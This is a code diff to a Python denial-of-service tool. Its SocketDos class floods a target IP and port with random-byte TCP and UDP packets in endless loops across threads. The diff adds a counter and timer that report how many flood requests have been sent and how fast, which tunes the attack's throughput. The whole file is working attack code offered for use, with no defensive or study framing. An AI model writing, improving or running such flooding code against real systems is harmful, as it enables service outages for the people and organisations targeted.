@@ -1,9 +1,11 @@
 import socket
 import random
+import sys
+import itertools
+import time
 from threading import Thread
 from src.utils import color_text
 from src.dos.constants import TCP, UDP
-
 
 class SocketDos():
 
@@ -14,6 +16,8 @@ class SocketDos():
         self.tcp_size_bytes = tcp_size_bytes
         self.udp_size_bytes = udp_size_bytes
         self.thread_number = thread_number
+        self.counter = itertools.count(1)
+        self.start = time.time()
 
     def tcp_flood(self):
         try:
@@ -22,6 +26,7 @@ class SocketDos():
                 sock.connect((self.target_ip, self.target_port))
                 bytes_to_send = random._urandom(self.tcp_size_bytes)
                 sock.sendall(bytes_to_send)
+                self.count_requests()
         except Exception as e:
             color_text('red', f'[!] Error in tcp_flood: {e}')
 
@@ -33,6 +38,16 @@ class SocketDos():
         bytes_to_send = random._urandom(self.udp_size_bytes)  # random bytes
         while True:
             sock.sendto(bytes_to_send, (self.target_ip, self.target_port))
+
+    def count_requests(self):
+
+        request_nb = next(self.counter)
+        
+        if request_nb % 10_000 == 0:
+            sys.stdout.write(f'{request_nb} request send !\r\n')
+            sys.stdout.flush()
+            end = time.time()
+            print(end - self.start)
 
     def start_attack(self):
         """
@@ -46,6 +61,7 @@ class SocketDos():
                         thread = Thread(target=self.udp_flood())
                     if self.protocol == TCP:
                         thread = Thread(target=self.tcp_flood())
+                    # thread.start()
                 else:
                     print('Bad method')
                     return
